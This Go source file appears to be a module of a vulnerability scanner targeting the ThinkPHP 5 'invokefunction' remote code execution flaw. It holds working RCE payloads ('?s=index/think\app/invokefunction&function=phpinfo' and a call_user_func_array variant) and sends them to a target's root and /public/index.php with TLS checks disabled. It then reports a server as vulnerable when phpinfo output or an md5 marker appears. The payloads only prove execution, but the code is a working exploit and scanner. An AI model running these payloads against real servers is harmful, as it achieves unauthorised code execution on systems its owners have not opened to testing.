package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

var payloads3 []string
//payload: ?s=index/think\app/invokefunction&function=phpinfo&vars[0]=100
// /index.php  /public/index.php
func get_rce(baseurl string)  {
	flag := get_rce1(baseurl) //接受返回的payload
	if  flag != "0"{
		fmt.Println(baseurl," [+] vul ! ! !\npayload: ",flag)
	} else {
		fmt.Println(baseurl," [-] not vull tpV5_invoke_func_code_rce")
	}
}

func get_rce1(baseurl string) string  {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	payloads3 := append(payloads3, "/?s=index/think\\app/invokefunction&function=phpinfo&vars[0]=100","/?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=((md5(2333))")
	for _, payload := range payloads3{
		flag := get_rce2(baseurl, payload)
		if flag != "0"{
			return flag
		}
		url := baseurl + "/public/index.php"+payload
		client := http.Client{
			Transport:     tr,
			CheckRedirect: nil,
			Jar:           nil,
			Timeout:       time.Second*5,
		}
		req, err := http.NewRequest("GET",url,nil)
		if err != nil {
			return "0"
		}
		req.Header.Set("User-Agent",user_agent)
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("[-] 请求超时，请检查url！ x.x")
			return "0"
		}
		body, _ := io.ReadAll(resp.Body)
		if (strings.Contains(string(body),"disable_functions")||strings.Contains(string(body),"56540676a129760a")){
			return payload
		} else {
			continue
		}
	}
	return "0"
}

func get_rce2(baseurl string,payload string) string {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	url := baseurl + payload
	client := http.Client{
		Transport:     tr,
		CheckRedirect: nil,
		Jar:           nil,
		Timeout:       time.Second*5,
	}
	req, err := http.NewRequest("GET",url,nil)
	if err != nil {
		return "0"
	}
	req.Header.Set("User-Agent",user_agent)
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("[-] 请求超时，请检查url！ x.x")
		return "0"
	}
	body, _ := io.ReadAll(resp.Body)
	if (strings.Contains(string(body),"disable_functions")||strings.Contains(string(body),"56540676a129760a")){
		return payload
	} else {
		return "0"
	}
}
